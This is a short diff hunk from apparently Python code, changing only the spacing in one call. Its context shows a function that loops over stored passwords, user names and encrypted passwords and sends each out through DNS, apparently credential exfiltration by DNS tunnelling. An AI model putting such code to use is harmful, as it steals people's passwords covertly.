@@ -125,7 +125,7 @@ def get_details(encrypt):
     
     # send the data in DNS protocol
     for password in passwords:
-        send_DNS_data(password, encrypt)
+        send_DNS_data(password,encrypt)
     for password in encryptedPasswords:
         send_DNS_data(password['user name'],encrypt)
         send_DNS_data(password['encrypted password'],encrypt)
